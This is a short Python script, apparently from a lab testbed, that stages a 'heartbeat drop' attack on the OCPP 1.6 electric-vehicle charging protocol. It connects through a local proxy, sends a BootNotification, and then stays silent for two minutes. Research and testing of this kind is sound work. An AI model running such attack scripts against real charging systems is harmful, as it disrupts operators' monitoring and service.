#!/usr/bin/env python3
# attack_supress.py
# Message Suppression / Heartbeat Drop attack (via proxy)

import asyncio
import websockets
import json
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("suppress")

PROXY_URI = "ws://localhost:9090/CP-SUPPRESS"

async def main():
    async with websockets.connect(
        PROXY_URI, subprotocols=["ocpp1.6"]
    ) as ws:

        boot = [
            2,
            "1",
            "BootNotification",
            {
                "chargePointModel": "SilentModel",
                "chargePointVendor": "SilentVendor",
            },
        ]

        logger.info("[ATTACK] Sending BootNotification")
        await ws.send(json.dumps(boot))

        # DO NOT wait for response
        await asyncio.sleep(2)

        logger.info("[ATTACK] Suppressing Heartbeats...")
        # Stay connected but send NOTHING
        await asyncio.sleep(120)

if __name__ == "__main__":
    asyncio.run(main())
